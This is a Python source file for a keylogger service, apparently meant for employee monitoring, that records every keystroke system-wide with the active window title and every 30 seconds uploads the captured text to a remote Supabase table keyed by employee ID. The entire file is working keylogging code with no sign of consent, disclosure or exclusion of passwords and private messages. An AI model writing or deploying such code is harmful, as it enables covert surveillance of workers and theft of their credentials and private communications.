import time
import asyncio
import ctypes
from pynput import keyboard
from supabase import Client

class KeyloggerService:
    def __init__(self, supabase: Client, employee_id: str):
        self.supabase = supabase
        self.employee_id = employee_id
        self.buffer = []
        self.last_flush = time.time()
        self.flush_interval = 30
        self.current_window = None

    def get_active_window_title(self):
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value or "Unknown Window"

    def on_press(self, key):
        # Check active window
        active_window = self.get_active_window_title()
        if active_window != self.current_window:
            self.current_window = active_window
            timestamp = time.strftime("%H:%M:%S")
            self.buffer.append(f"\n[{timestamp} | APP: {active_window}]\n")

        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.backspace:
                char = '[BS]'
            else:
                char = f'[{key.name}]'
        
        self.buffer.append(char)

    async def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        
        print("Keylogger started with Window detection.")
        
        while True:
            await asyncio.sleep(1)
            if time.time() - self.last_flush > self.flush_interval:
                await self.flush()

    async def flush(self):
        if not self.buffer:
            self.last_flush = time.time()
            return

        text_block = "".join(self.buffer)
        self.buffer = []
        self.last_flush = time.time()

        try:
            self.supabase.table("keylogs").insert({
                "employee_id": self.employee_id,
                "content": text_block
            }).execute()
            print("Keylogs flushed.")
        except Exception as e:
            print(f"Error flushing keylogs: {e}")
